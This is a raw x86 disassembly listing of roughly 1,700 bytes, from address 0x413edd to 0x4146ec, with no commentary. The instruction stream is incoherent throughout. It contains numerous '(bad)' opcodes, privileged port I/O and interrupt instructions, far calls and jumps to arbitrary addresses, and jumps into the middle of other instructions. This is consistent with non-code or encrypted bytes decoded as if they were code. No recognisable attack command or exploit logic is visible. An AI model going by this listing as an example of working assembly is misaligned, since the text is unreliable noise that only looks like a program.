  413edd:	adc    ebp,DWORD PTR ds:0xc1e38160
  413ee3:	adc    DWORD PTR [eax-0x3b],ebx
  413ee6:	mov    ebp,0xc19276f2
  413eeb:	or     BYTE PTR ds:0xe0b4f82a,ah
  413ef1:	call   0x7d18327c
  413ef6:	popf   
  413ef7:	sub    eax,0xbfdfb562
  413efc:	ja     0x413f5d
  413efe:	or     BYTE PTR [eax],ch
  413f00:	push   cs
  413f01:	imul   eax,DWORD PTR [ebx+0x977b2e8],0x6fa9c9b6
  413f0b:	(bad)  
  413f0d:	retf   
  413f0e:	aaa    
  413f0f:	aam    0xe3
  413f11:	mov    edi,DWORD PTR [esi+0x7]
  413f14:	inc    ecx
  413f15:	pop    ebx
  413f16:	js     0x413edf
  413f18:	fidiv  WORD PTR [edx]
  413f1a:	adc    BYTE PTR [edi+0x4d],0x3d
  413f1e:	and    eax,0xb67cd98f
  413f23:	pop    eax
  413f24:	push   ecx
  413f25:	xor    BYTE PTR [ebp-0x2],ch
  413f28:	pop    ecx
  413f29:	(bad)  [edi+0x3436c946]
  413f2f:	xchg   BYTE PTR [edi+ecx*8-0x36],dl
  413f33:	sbb    al,0x77
  413f35:	cmp    esi,esi
  413f37:	jmp    0x413ed6
  413f39:	xchg   bh,ah
  413f3b:	lods   al,BYTE PTR ds:[esi]
  413f3c:	lea    eax,[ebp+ebx*4+0x47c50c9]
  413f43:	add    bl,BYTE PTR [esi+0x1b]
  413f46:	aaa    
  413f47:	or     eax,0xa1ec03c6
  413f4c:	push   cs
  413f4d:	adc    DWORD PTR [esi],0xfffffff1
  413f50:	fwait
  413f51:	add    al,BYTE PTR [esi+0x48103217]
  413f57:	jmp    0x413f17
  413f59:	ins    BYTE PTR es:[edi],dx
  413f5a:	mov    ds:0x7df58a93,al
  413f5f:	test   BYTE PTR [ecx+0xa],al
  413f62:	mov    gs,WORD PTR ds:0x773bfd8d
  413f68:	in     eax,dx
  413f69:	ds mov eax,0xb0c002e3
  413f6f:	lea    edx,[edi+edx*2]
  413f72:	cmp    DWORD PTR [ecx+esi*8-0x46],edi
  413f76:	cdq    
  413f77:	nop
  413f78:	xchg   esi,eax
  413f79:	mov    al,ds:0xd351e234
  413f7e:	cwde   
  413f7f:	xchg   esi,eax
  413f80:	sahf   
  413f81:	rcr    DWORD PTR [ebx+edi*1-0x36],0xe5
  413f86:	ffree  st(4)
  413f88:	loop   0x413f14
  413f8a:	rcl    ah,1
  413f8c:	rcl    dh,0x50
  413f8f:	jmp    0xa4387292
  413f94:	cmp    al,0x98
  413f96:	mov    ds:0x9c1f6ed4,eax
  413f9b:	addr16 aaa 
  413f9d:	and    eax,0x47755006
  413fa2:	lock pop ecx
  413fa4:	push   esp
  413fa5:	xchg   esp,eax
  413fa6:	das    
  413fa7:	(bad)  
  413fa9:	fdivr  st,st(1)
  413fab:	(bad)  
  413fac:	cmp    eax,0xdf773e65
  413fb1:	aaa    
  413fb2:	clc    
  413fb3:	pop    ebx
  413fb4:	mov    bh,0x17
  413fb6:	add    DWORD PTR [ecx+0x7f836537],ebp
  413fbc:	xchg   ebx,eax
  413fbd:	sub    esi,DWORD PTR [edi+edi*2-0x2f]
  413fc1:	sahf   
  413fc2:	or     eax,0xf2656244
  413fc7:	jg     0x413fef
  413fc9:	sbb    ebx,DWORD PTR [eax]
  413fcb:	ja     0x413fa6
  413fcd:	pop    ebp
  413fce:	rcl    ah,0xab
  413fd1:	jnp    0x414022
  413fd3:	jno    0x413f79
  413fd5:	in     eax,0xe1
  413fd7:	int3   
  413fd8:	cmp    eax,0x73446a72
  413fdd:	sub    bl,BYTE PTR [edi+0x60]
  413fe0:	ret    0x7752
  413fe3:	dec    esi
  413fe4:	addr16 mov esp,0xb1942add
  413fea:	mov    esi,0x5ced89a3
  413fef:	ja     0x414050
  413ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ff2:	retf   0xf904
  413ff5:	ficom  DWORD PTR [esi+0x2c2c760d]
  413ffb:	bnd jae 0x413f8e
  413ffe:	xchg   BYTE PTR [eax+0x27],dl
  414001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414002:	xchg   edi,eax
  414003:	sub    al,0xb9
  414005:	sub    al,dh
  414007:	jp     0x413ffe
  414009:	jns    0x413ffb
  41400b:	push   ebx
  41400c:	cdq    
  41400d:	mov    bl,0x83
  41400f:	mov    eax,0x97abd510
  414014:	push   ebx
  414015:	mov    ch,BYTE PTR [ecx+ecx*2+0x8]
  414019:	or     eax,0x4c9d21f
  41401e:	fisttp QWORD PTR [edi+0x19]
  414021:	jecxz  0x413fce
  414023:	ret    0x1b8e
  414026:	ins    BYTE PTR es:[edi],dx
  414027:	cmp    BYTE PTR [edx+0x4c],0x38
  41402b:	int    0xe1
  41402d:	mov    bh,0xef
  41402f:	rcl    BYTE PTR [edi],1
  414031:	push   ss
  414032:	mov    al,0x14
  414034:	dec    dx
  414036:	in     al,0x8f
  414038:	jo     0x41404c
  41403a:	mov    ds:0x3944c528,al
  41403f:	stos   BYTE PTR es:[edi],al
  414040:	xchg   edx,eax
  414041:	xchg   esp,eax
  414042:	cld    
  414043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414044:	dec    ch
  414046:	jnp    0x414071
  414048:	shl    BYTE PTR [edi+0x7d],1
  41404b:	jnp    0x4140b6
  41404d:	shl    DWORD PTR [esi-0x28],cl
  414050:	push   ss
  414051:	dec    ebp
  414052:	push   0xffffff9d
  414054:	cmp    BYTE PTR [ecx+0x58cf2ce2],bl
  41405a:	int3   
  41405b:	dec    esp
  41405c:	aas    
  41405d:	out    dx,eax
  41405e:	ins    DWORD PTR es:[edi],dx
  41405f:	sar    ch,0xb9
  414062:	pop    esi
  414063:	repnz call 0xf532:0x1f6140c7
  41406b:	jne    0x414025
  41406d:	mov    al,0x30
  41406f:	sbb    eax,0x13e46563
  414074:	movnti DWORD PTR [ecx*2+0x13eb3cb1],ecx
  41407c:	pop    edx
  41407d:	pop    esp
  41407e:	mov    ds:0x5ac0a9f5,eax
  414083:	mov    edx,0x570256de
  414088:	pushf  
  414089:	mov    ebx,0x912e44da
  41408e:	jg     0x414026
  414090:	scas   al,BYTE PTR es:[edi]
  414091:	lods   eax,DWORD PTR ds:[esi]
  414092:	cs xor ch,cl
  414095:	mov    dh,0x98
  414097:	mov    edi,0xd687bc1f
  41409c:	jmp    0xaa1c:0xe7ea802c
  4140a3:	dec    edi
  4140a4:	and    BYTE PTR [eax-0x2b971e25],0x70
  4140ab:	fmul   st,st(0)
  4140ad:	mov    edx,0x42c3548
  4140b2:	int3   
  4140b3:	mov    BYTE PTR [edx+0x48b06b45],ch
  4140b9:	pop    edx
  4140ba:	stos   BYTE PTR es:[edi],al
  4140bb:	pop    ebp
  4140bc:	and    al,0xca
  4140be:	jecxz  0x414068
  4140c0:	cmc    
  4140c1:	retf   
  4140c2:	stos   DWORD PTR es:[edi],eax
  4140c3:	sub    eax,esp
  4140c5:	xchg   esp,eax
  4140c6:	push   ecx
  4140c7:	and    ah,BYTE PTR [ecx+0x37]
  4140ca:	inc    eax
  4140cb:	push   ecx
  4140cc:	aas    
  4140cd:	adc    edi,DWORD PTR [esi-0x48]
  4140d0:	and    cl,BYTE PTR es:0x9be6db2a
  4140d7:	pusha  
  4140d8:	cmp    eax,0x5f40bb2d
  4140dd:	sub    al,0xa2
  4140df:	jmp    0x414088
  4140e1:	fiadd  WORD PTR [edi]
  4140e3:	mov    cl,0x92
  4140e5:	jne    0x41406c
  4140e7:	in     eax,0xf
  4140e9:	xor    DWORD PTR [esi+0xaeb0004],edx
  4140ef:	jmp    0xd5523b27
  4140f4:	cdq    
  4140f5:	div    DWORD PTR [ebp+0x2]
  4140f8:	push   ds
  4140f9:	sahf   
  4140fa:	lods   eax,DWORD PTR ds:[esi]
  4140fb:	inc    esi
  4140fc:	mov    ebx,DWORD PTR [eax]
  4140fe:	(bad)  
  4140ff:	sub    al,0x56
  414101:	add    DWORD PTR [esi+0x31161aad],ebx
  414107:	cmp    al,0xc5
  414109:	sahf   
  41410a:	dec    ebx
  41410b:	cmp    DWORD PTR [ecx+0x6e],edx
  41410e:	push   es
  41410f:	sar    DWORD PTR [ecx-0x52b6f711],1
  414115:	adc    eax,0xdab4f6da
  41411a:	test   al,0x7f
  41411c:	lock pop edi
  41411e:	cwde   
  41411f:	mov    ds:0xb2af0f47,al
  414124:	imul   ebp,DWORD PTR es:[bx+di],0x8
  414129:	into   
  41412a:	mov    eax,DWORD PTR [esi+0x4458a8fe]
  414130:	or     bl,BYTE PTR [ebp-0x55]
  414133:	sub    bl,bl
  414135:	scas   eax,DWORD PTR es:[edi]
  414136:	pop    eax
  414137:	test   DWORD PTR [ebx-0x4c],0xf64d5e9d
  41413e:	xor    DWORD PTR [edx],edx
  414140:	and    eax,0x4898bf38
  414145:	xchg   esp,eax
  414146:	(bad)  
  414147:	xlat   BYTE PTR ds:[ebx]
  414148:	jp     0x4141b5
  41414a:	mov    dl,0xf3
  41414c:	(bad)  
  41414d:	xchg   ebp,eax
  41414e:	pop    ss
  41414f:	mov    WORD PTR [ebx],fs
  414151:	adc    bh,BYTE PTR fs:[ecx+0x2f9de740]
  414158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414159:	add    eax,DWORD PTR [edx+0x72]
  41415c:	sub    DWORD PTR [edi],ebx
  41415e:	(bad)  
  41415f:	out    dx,al
  414160:	fiadd  WORD PTR [ecx+0x1]
  414163:	xlat   BYTE PTR ds:[ebx]
  414164:	in     eax,0xc9
  414166:	mov    DWORD PTR [ecx-0x5a],ebp
  414169:	adc    BYTE PTR [esi+0x8],ch
  41416c:	(bad)  
  41416e:	pushf  
  41416f:	jmp    0x4141c0
  414171:	mov    al,ds:0xb87cea60
  414176:	(bad)  
  414177:	mul    cl
  414179:	popf   
  41417a:	adc    ch,bh
  41417c:	mov    ah,0x73
  41417e:	outs   dx,DWORD PTR ds:[esi]
  41417f:	mov    ds:0xeb64e0ec,eax
  414184:	pop    fs
  414186:	sub    bh,BYTE PTR [ecx-0x6c]
  414189:	loope  0x41418d
  41418b:	push   ebx
  41418c:	stc    
  41418d:	xlat   BYTE PTR ds:[ebx]
  41418e:	xchg   esp,eax
  41418f:	add    bl,BYTE PTR [edi-0x27]
  414192:	xor    edi,eax
  414194:	adc    al,0x6e
  414196:	jl     0x4141e2
  414198:	mov    ah,bl
  41419a:	call   0x8c42:0x64f7133c
  4141a1:	inc    eax
  4141a2:	cld    
  4141a3:	fisub  WORD PTR [eax+0x5b713cf6]
  4141a9:	cld    
  4141aa:	pop    es
  4141ab:	sti    
  4141ac:	inc    esp
  4141ad:	aam    0x43
  4141af:	push   edx
  4141b0:	aad    0xef
  4141b2:	repnz jmp 0x8750:0xbd824249
  4141ba:	inc    edx
  4141bb:	daa    
  4141bc:	and    eax,0x6577f16e
  4141c1:	outs   dx,BYTE PTR ds:[esi]
  4141c2:	inc    ebp
  4141c3:	dec    ecx
  4141c4:	inc    esi
  4141c5:	xor    ebp,esi
  4141c7:	mov    WORD PTR [ecx+0x12],gs
  4141ca:	mov    bl,0x52
  4141cc:	(bad)  
  4141cd:	les    esi,FWORD PTR [ebp+0x7a]
  4141d0:	test   DWORD PTR [edx],esi
  4141d2:	fwait
  4141d3:	push   ebp
  4141d4:	enter  0x3b59,0x86
  4141d8:	popa   
  4141d9:	dec    ebp
  4141da:	in     al,dx
  4141db:	sbb    BYTE PTR [ecx],cl
  4141dd:	jno    0x4141e8
  4141df:	call   0x39f4:0x920cda15
  4141e6:	mov    al,BYTE PTR [edx+0x6d50e76a]
  4141ec:	adc    eax,0xf0b9db02
  4141f1:	inc    esp
  4141f2:	mov    esi,0xf958425c
  4141f7:	hlt    
  4141f8:	mov    esp,0x52dbf87e
  4141fd:	js     0x41420f
  4141ff:	mov    edi,0x4e03492c
  414204:	popf   
  414205:	sbb    DWORD PTR [ecx-0x541194af],edi
  41420b:	jae    0x414250
  41420d:	pop    eax
  41420e:	aas    
  41420f:	inc    ebx
  414210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414212:	sub    eax,0x6e9fb72e
  414217:	mov    ecx,0xf7037fbc
  41421c:	mov    edi,0x9ac5d290
  414221:	adc    ebx,DWORD PTR [edx]
  414223:	xor    BYTE PTR [bp+si],al
  414226:	pop    edx
  414227:	or     esi,DWORD PTR [ebp-0x50]
  41422a:	push   edi
  41422b:	add    bl,BYTE PTR [ebx+0x5d8be12b]
  414231:	(bad)  
  414232:	outs   dx,BYTE PTR ds:[esi]
  414233:	hlt    
  414234:	cmp    eax,0x6426b21
  414239:	push   0x56748add
  41423e:	pop    ecx
  41423f:	sbb    al,0xcf
  414241:	ds jg  0x414212
  414244:	mov    al,ds:0x946a476
  414249:	sbb    bh,BYTE PTR [edi]
  41424b:	gs cdq 
  41424d:	out    dx,al
  41424e:	frstor [ecx-0x3a]
  414251:	mov    DWORD PTR [edx],edx
  414253:	jle    0x41424b
  414255:	popf   
  414256:	sar    BYTE PTR [eax+eax*8+0x26],cl
  41425a:	xor    DWORD PTR [ebp-0x4da9b4d6],0xffffffed
  414261:	xchg   ecx,eax
  414262:	fwait
  414263:	test   BYTE PTR [ebx],bh
  414265:	in     eax,dx
  414266:	loopne 0x41427d
  414268:	int3   
  414269:	lds    esi,FWORD PTR ds:0x9fcdfeda
  41426f:	xor    BYTE PTR [edi-0x2ee99768],0x8d
  414276:	pushf  
  414277:	dec    edi
  414278:	in     eax,0xb4
  41427a:	inc    eax
  41427b:	aas    
  41427c:	fistp  WORD PTR [edx]
  41427e:	lods   eax,DWORD PTR ds:[esi]
  41427f:	push   esi
  414280:	aam    0xff
  414282:	std    
  414283:	sub    esp,ebp
  414285:	mov    esp,0x112e3e5f
  41428a:	sbb    al,0x69
  41428c:	icebp  
  41428d:	sub    edx,DWORD PTR [esi+0x40]
  414290:	(bad)  
  414291:	in     al,0xeb
  414293:	mov    ds:0xe65f39e9,al
  414298:	loop   0x414287
  41429a:	dec    edi
  41429b:	xor    eax,0x9a18544e
  4142a0:	dec    edx
  4142a1:	stos   BYTE PTR es:[edi],al
  4142a2:	sar    DWORD PTR [edi],1
  4142a4:	in     al,dx
  4142a5:	lahf   
  4142a6:	scas   al,BYTE PTR es:[edi]
  4142a7:	mov    edx,0xe135371e
  4142ac:	cmp    edi,DWORD PTR [esi+eiz*2-0x8]
  4142b0:	add    eax,0x1e08b320
  4142b5:	movups xmm2,XMMWORD PTR [eax+edx*8+0x4a270f64]
  4142bd:	push   es
  4142be:	xchg   esi,eax
  4142bf:	jge    0x414241
  4142c1:	inc    esp
  4142c2:	retf   
  4142c3:	std    
  4142c4:	push   es
  4142c5:	mov    eax,ds:0x232f8713
  4142ca:	rol    BYTE PTR [esi-0x2b9f132],1
  4142d0:	scas   eax,DWORD PTR es:[edi]
  4142d1:	pop    edx
  4142d2:	dec    esp
  4142d3:	sbb    ecx,ebp
  4142d5:	dec    esp
  4142d6:	rol    BYTE PTR [edx-0x19acd8e2],1
  4142dc:	pusha  
  4142dd:	jns    0x414336
  4142df:	cmp    ecx,DWORD PTR [ebx-0x21]
  4142e2:	jg     0x4142d2
  4142e4:	repnz or eax,0xa614fc9
  4142ea:	out    0x51,al
  4142ec:	jne    0x414303
  4142ee:	and    eax,0x79d97c55
  4142f3:	call   0xf4d6:0x45aca553
  4142fa:	test   eax,0xa64ab5b1
  4142ff:	mov    eax,0x8aff0e45
  414304:	les    ecx,FWORD PTR [esi-0x7b4999e0]
  41430a:	mov    dl,0x5a
  41430c:	in     al,dx
  41430d:	out    dx,al
  41430e:	inc    ecx
  41430f:	shr    dl,0xe1
  414312:	sti    
  414313:	xchg   edi,eax
  414314:	xor    eax,0xbf4ae4fc
  414319:	jo     0x4142d2
  41431b:	cmp    ecx,edi
  41431d:	clc    
  41431e:	mov    dh,0x19
  414320:	mov    WORD PTR [esi+0x58771bb3],ss
  414326:	scas   eax,DWORD PTR es:[edi]
  414327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414328:	test   al,ah
  41432a:	(bad)  
  41432b:	ds (bad) 
  41432d:	clc    
  41432e:	enter  0xd385,0x39
  414332:	dec    BYTE PTR [edx+0x63739b7d]
  414338:	in     eax,dx
  414339:	loope  0x41435f
  41433b:	push   ss
  41433c:	ins    DWORD PTR es:[edi],dx
  41433d:	or     DWORD PTR [ebx-0x4045166f],esi
  414343:	test   eax,0x7c108ac5
  414348:	mov    edx,0x9a87f91f
  41434d:	shl    DWORD PTR [ebx],1
  41434f:	in     eax,dx
  414350:	sub    eax,0x1a9b801f
  414355:	xor    esp,DWORD PTR [ecx-0x892f070]
  41435b:	fsubr  DWORD PTR [edi]
  41435d:	jae    0x414372
  41435f:	ret    
  414360:	(bad)  
  414362:	adc    eax,0x82d1288b
  414367:	(bad)  
  414368:	call   0xca8c:0xcd33513a
  41436f:	mov    cl,0x75
  414371:	mov    bh,0x91
  414373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414374:	and    BYTE PTR [ebp-0x3e],ah
  414377:	lock jg 0x414304
  41437a:	lahf   
  41437b:	mov    DWORD PTR [edi],edi
  41437d:	scas   al,BYTE PTR es:[edi]
  41437e:	in     al,dx
  41437f:	loopne 0x414315
  414381:	stc    
  414382:	imul   ebx,esp,0x6f
  414385:	aad    0x5e
  414387:	fs jo  0x4143de
  41438a:	push   ecx
  41438b:	les    ecx,FWORD PTR [esi+0xa]
  41438e:	mov    al,ds:0x803a5fd6
  414393:	in     eax,dx
  414394:	add    al,0x60
  414396:	test   eax,0x32152a89
  41439b:	jb     0x4143e6
  41439d:	pop    ds
  41439e:	ds mov cl,0x32
  4143a1:	adc    al,0xd
  4143a3:	pop    ebx
  4143a4:	and    eax,DWORD PTR [ebx]
  4143a6:	inc    edi
  4143a7:	leave  
  4143a8:	add    ebp,esi
  4143aa:	cmp    eax,0x5c283ec5
  4143af:	add    BYTE PTR [esi+0x48a198ed],0x1f
  4143b6:	cmp    BYTE PTR [eax-0x1075a647],bh
  4143bc:	pusha  
  4143bd:	mov    al,0xe0
  4143bf:	mov    esi,0x6e1b04b5
  4143c4:	pop    eax
  4143c5:	add    DWORD PTR [ebx+0x32f9793a],esp
  4143cb:	xchg   ebx,eax
  4143cc:	pushf  
  4143cd:	cdq    
  4143ce:	push   ecx
  4143cf:	stos   DWORD PTR es:[edi],eax
  4143d0:	dec    ebp
  4143d1:	test   edx,edi
  4143d3:	retf   
  4143d4:	ss out dx,al
  4143d6:	adc    eax,0xf3f180b3
  4143db:	adc    al,0x8e
  4143dd:	dec    esp
  4143de:	inc    ecx
  4143df:	push   ebx
  4143e0:	xchg   ebp,eax
  4143e1:	pavgw  mm5,QWORD PTR [edx]
  4143e4:	gs jg  0x414424
  4143e7:	adc    esi,edi
  4143e9:	mov    dh,ch
  4143eb:	pop    ds
  4143ec:	mov    cs,WORD PTR [ecx+0x79327a98]
  4143f2:	dec    ebp
  4143f3:	add    eax,0x9014f753
  4143f8:	dec    ebp
  4143f9:	mov    ebx,0x572471fa
  4143fe:	jge    0x414431
  414400:	inc    ecx
  414401:	mov    ds:0x519f503f,eax
  414406:	clc    
  414407:	pop    ds
  414408:	dec    ebp
  414409:	mov    ds:0xfcf09a79,al
  41440e:	stos   DWORD PTR es:[edi],eax
  41440f:	lahf   
  414410:	cmp    ah,0xb2
  414413:	push   edi
  414414:	xchg   ecx,eax
  414415:	les    ebp,FWORD PTR [ecx+0x7d907cf7]
  41441b:	jae    0x41444f
  41441d:	stos   DWORD PTR es:[edi],eax
  41441e:	jo     0x41443e
  414420:	jae    0x41441e
  414422:	jbe    0x41445b
  414424:	jnp    0x414439
  414426:	cdq    
  414427:	stos   BYTE PTR es:[edi],al
  414428:	clc    
  414429:	push   esi
  41442a:	pop    edx
  41442b:	loopne 0x41445a
  41442d:	inc    edi
  41442e:	in     al,dx
  41442f:	mov    bl,0x22
  414431:	or     DWORD PTR [esi+0x1f4bd9b7],0x23
  414438:	sti    
  414439:	lea    esp,[edi-0x7d]
  41443c:	fadd   st(1),st
  41443e:	pop    esp
  41443f:	mov    cl,0x3e
  414441:	jnp    0x4143ce
  414443:	jmp    0xd5b0:0x41406d23
  41444a:	jnp    0x4144c9
  41444c:	jg     0x4144cb
  41444e:	cdq    
  41444f:	mov    ebp,0xe58f5f0
  414454:	dec    edx
  414455:	jbe    0x4144b5
  414457:	adc    al,0x96
  414459:	dec    esi
  41445a:	sub    bl,dl
  41445c:	jb     0x414449
  41445e:	cdq    
  41445f:	jmp    0x46bd6f86
  414464:	cli    
  414465:	fs in  eax,dx
  414467:	mov    al,0x26
  414469:	pop    esi
  41446a:	sub    al,0xcc
  41446c:	sub    eax,0x16b618d8
  414471:	xchg   BYTE PTR [eax-0x5cfdee20],al
  414477:	add    dh,BYTE PTR [edx]
  414479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41447a:	jae    0x4144de
  41447c:	nop
  41447d:	std    
  41447e:	stos   DWORD PTR es:[edi],eax
  41447f:	jmp    0x41448f
  414481:	or     ebp,ebx
  414483:	mov    ds:0xe44244e9,al
  414488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414489:	js     0x414509
  41448b:	xlat   BYTE PTR ds:[ebx]
  41448c:	mov    dh,bl
  41448e:	and    eax,0xbb3c1e75
  414493:	pop    esi
  414494:	popa   
  414495:	(bad)  
  414496:	std    
  414497:	test   eax,0x1f763a6a
  41449c:	pop    edx
  41449d:	mov    ebx,0xedad6421
  4144a2:	or     BYTE PTR [ecx+0x0],0x5e
  4144a6:	cli    
  4144a7:	pop    ecx
  4144a8:	mov    al,ds:0x8cb0fe8c
  4144ad:	adc    BYTE PTR [ebx+eax*2-0x42728118],bl
  4144b4:	lods   al,BYTE PTR ds:[esi]
  4144b5:	jno    0x4144fc
  4144b7:	fnclex 
  4144b9:	pop    ecx
  4144ba:	mov    ch,0x4b
  4144bc:	ret    0x7e5e
  4144bf:	pop    es
  4144c0:	mov    edx,DWORD PTR [eax]
  4144c2:	jle    0x4144f1
  4144c4:	(bad)  
  4144c5:	mov    ds:0x9c6a5244,eax
  4144ca:	arpl   WORD PTR [edi+edi*1+0x2a563201],dx
  4144d1:	add    esi,DWORD PTR [ecx+eiz*4]
  4144d4:	inc    esp
  4144d5:	cmp    BYTE PTR ds:0xb7b526f2,bh
  4144db:	test   eax,0x2d88145
  4144e0:	shl    BYTE PTR [eax],1
  4144e2:	cli    
  4144e3:	adc    DWORD PTR [edx+0x5b],0x60096ef4
  4144ea:	call   0x3105516b
  4144ef:	jl     0x414532
  4144f1:	adc    edx,DWORD PTR [edi+0x13]
  4144f4:	enter  0xd79,0x68
  4144f8:	das    
  4144f9:	push   ecx
  4144fa:	mov    cl,0xae
  4144fc:	test   BYTE PTR [ebx-0x5df764b1],bh
  414502:	in     eax,dx
  414503:	pop    ecx
  414504:	shr    BYTE PTR [eax-0x5d],cl
  414507:	cli    
  414508:	sbb    al,0x15
  41450a:	mov    dl,0x3f
  41450c:	int    0xd5
  41450e:	xchg   BYTE PTR [ecx+0x17be4fb0],ah
  414514:	arpl   WORD PTR [esi-0x30ac5bf6],cx
  41451a:	ret    0x7512
  41451d:	shl    BYTE PTR [edi],cl
  41451f:	inc    esi
  414520:	popa   
  414521:	cmp    DWORD PTR [edx+0x2b35fb47],edx
  414527:	or     eax,0xc4c0e136
  41452c:	or     DWORD PTR [ecx],edi
  41452e:	pop    eax
  41452f:	add    DWORD PTR [edi],edi
  414531:	popf   
  414532:	xor    ebp,esi
  414534:	repnz outs dx,DWORD PTR ds:[esi]
  414536:	dec    ebp
  414537:	hlt    
  414538:	dec    ecx
  414539:	dec    eax
  41453a:	loop   0x414580
  41453c:	sbb    al,0x3f
  41453e:	(bad)  ds:0x80fd1c0f
  414544:	mov    bh,0xce
  414546:	xchg   ebx,eax
  414547:	in     eax,dx
  414548:	icebp  
  414549:	mov    al,0xca
  41454b:	push   0xffffffd6
  41454d:	push   0xb5f1f1b1
  414552:	jp     0x41455d
  414554:	out    dx,al
  414555:	or     DWORD PTR [ecx+ebx*1],0xffffffe3
  414559:	shl    BYTE PTR [eax],cl
  41455b:	sbb    DWORD PTR [ecx-0x5b4013b1],esi
  414561:	cdq    
  414562:	mov    edi,0xc05623ed
  414567:	mov    al,ds:0x3df6117d
  41456c:	mov    dl,0x82
  41456e:	cli    
  41456f:	es jns 0x4144fe
  414572:	push   ss
  414573:	xchg   ebp,eax
  414574:	xchg   edx,eax
  414575:	cmp    esi,DWORD PTR [esi+0x132ccacf]
  41457b:	fisub  DWORD PTR [ebx+eiz*4]
  41457e:	sahf   
  41457f:	xchg   ebx,eax
  414580:	cli    
  414581:	repnz shl BYTE PTR [esi-0x6520c8f],0x1a
  414589:	(bad)  
  41458a:	dec    edx
  41458b:	add    DWORD PTR [ebx+0x20],esi
  41458e:	fwait
  41458f:	and    DWORD PTR [ebx],0x3
  414592:	rcl    DWORD PTR ds:[esi+0x16],1
  414596:	cmp    DWORD PTR [ebp-0x5e],esi
  414599:	push   ebp
  41459a:	pop    ds
  41459b:	sub    eax,0x8197ccda
  4145a0:	push   esp
  4145a1:	(bad)  
  4145a2:	call   0x1588:0x7622cb8f
  4145a9:	mov    eax,0x3f91dda6
  4145ae:	jno    0x4145dd
  4145b0:	(bad)  
  4145b1:	ja     0x4145cb
  4145b3:	iret   
  4145b4:	jbe    0x41462a
  4145b6:	and    al,0xa5
  4145b8:	pop    eax
  4145b9:	and    eax,0x1e9ffe67
  4145be:	fwait
  4145bf:	test   BYTE PTR [ecx],ch
  4145c1:	mov    ecx,0xbb44d61f
  4145c6:	cwde   
  4145c7:	inc    edx
  4145c8:	dec    edx
  4145c9:	mov    ebp,0x42db885c
  4145ce:	push   ebx
  4145cf:	mov    ?,eax
  4145d1:	mov    edx,0x351354bb
  4145d6:	and    BYTE PTR [ecx],0x46
  4145d9:	out    0xba,eax
  4145db:	cdq    
  4145dc:	push   es
  4145dd:	and    al,0xa5
  4145df:	xchg   edx,eax
  4145e0:	adc    eax,0xe13ca669
  4145e5:	mov    ah,0x93
  4145e7:	mov    BYTE PTR [ecx+0x60f3d71c],ch
  4145ed:	push   edx
  4145ee:	fldcw  WORD PTR [ecx+0x1daba81a]
  4145f4:	adc    ecx,ebp
  4145f6:	inc    ebx
  4145f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145f8:	inc    esp
  4145f9:	cmp    eax,0xa36b9291
  4145fe:	pop    ss
  4145ff:	arpl   WORD PTR [esi-0x4e36a6b1],dx
  414605:	inc    DWORD PTR [eax]
  414607:	dec    edx
  414608:	test   eax,0xea79e0b6
  41460d:	or     cl,BYTE PTR [edx-0x77113bc4]
  414613:	xor    DWORD PTR [edx],0xdfda9a3d
  414619:	xor    esi,DWORD PTR [edi-0xe9af892]
  41461f:	fnsave [edi+eax*4+0x3deb48f]
  414626:	and    DWORD PTR [edx-0x4c],esi
  414629:	mov    ebx,0x7f8bed5e
  41462e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41462f:	in     eax,0x77
  414631:	shl    bh,1
  414633:	inc    esi
  414634:	fidiv  WORD PTR [esi]
  414636:	mov    ebx,0x86254587
  41463b:	fsub   QWORD PTR [eax+edi*1]
  41463e:	loope  0x4146aa
  414640:	add    ah,bl
  414642:	xor    al,BYTE PTR [edi-0x68]
  414645:	push   edi
  414646:	and    eax,0x1bb5cb5
  41464b:	cdq    
  41464c:	jg     0x414614
  41464e:	sbb    al,0x41
  414650:	push   esp
  414651:	jmp    FWORD PTR ds:0x47157f43
  414657:	in     eax,0x67
  414659:	lods   al,BYTE PTR ds:[esi]
  41465a:	mov    esi,0x3cc408b7
  41465f:	push   ebx
  414660:	or     cl,dl
  414662:	cwde   
  414663:	cmc    
  414664:	dec    esp
  414665:	test   al,0x4c
  414667:	(bad)  
  414668:	(bad)  
  414669:	iret   
  41466a:	add    BYTE PTR fs:[esi+0x2bd3121a],al
  414671:	ss call 0xc6bd:0xf95aed27
  414679:	push   esp
  41467a:	and    bh,BYTE PTR [esi-0x7bafc13d]
  414680:	add    DWORD PTR [edi],eax
  414682:	popa   
  414683:	sbb    eax,0xefa73965
  414688:	pop    ecx
  414689:	loopne 0x41467f
  41468b:	xor    eax,0x625d0a08
  414690:	xchg   ebx,eax
  414691:	loop   0x414627
  414693:	or     al,0xe2
  414695:	popf   
  414696:	sbb    ebx,DWORD PTR ds:0x1942fb3e
  41469c:	push   es
  41469d:	(bad)  
  41469f:	xchg   esp,eax
  4146a0:	inc    ecx
  4146a1:	sub    DWORD PTR [edx-0x7b],edx
  4146a4:	jnp    0x414636
  4146a6:	in     eax,dx
  4146a7:	pop    ecx
  4146a8:	(bad)  
  4146a9:	stos   DWORD PTR es:[edi],eax
  4146aa:	cmp    eax,0xe709d174
  4146af:	cmp    DWORD PTR [ebp+0x1cb8f9a0],edx
  4146b5:	outs   dx,DWORD PTR ds:[esi]
  4146b6:	(bad)  
  4146b7:	call   DWORD PTR [ecx+0x29]
  4146ba:	push   es
  4146bb:	mov    edi,0xbb75d4f1
  4146c0:	xor    cl,BYTE PTR [eax-0x54]
  4146c3:	and    DWORD PTR [ecx],ebx
  4146c5:	adc    eax,0xe20d1ced
  4146ca:	mov    fs,WORD PTR [edx-0x5d]
  4146cd:	jmp    DWORD PTR [edx+0x1]
  4146d0:	data16 ja 0x41473f
  4146d3:	add    bh,ch
  4146d5:	mov    edx,0xb250e2c7
  4146da:	mov    ds:0x6db9fe1,al
  4146df:	mov    ebx,0xca46435b
  4146e4:	mov    eax,0x70ce3ce1
  4146e9:	rol    ebx,0xe3
  4146ec:	lahf   
